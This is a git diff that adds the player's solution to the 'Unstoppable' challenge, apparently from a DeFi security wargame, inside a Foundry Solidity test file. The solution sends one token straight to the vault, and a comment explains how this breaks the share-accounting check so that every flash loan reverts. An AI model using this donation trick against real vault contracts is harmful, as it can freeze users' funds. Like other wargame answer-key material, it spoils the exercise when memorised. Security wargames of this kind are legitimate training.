@@ -86,12 +86,21 @@ contract UnstoppableChallenge is Test {
         vm.expectRevert("UNAUTHORIZED");
         monitorContract.checkFlashLoan(100e18);
     }
+   
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
+     /**
+     uint256 balanceBefore = totalAssets();
+    // balanceBefore is now inflated by 1
+
+    if (convertToShares(totalSupply) != balanceBefore) 
+        revert InvalidBalance();
+    // left side  = what shares say the balance should be
+    // right side = what the balance actually is
+    // they never match again → always reverts
+    */
+    //SOLUTION
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        token.transfer(address(vault),1);
     }
 
     /**
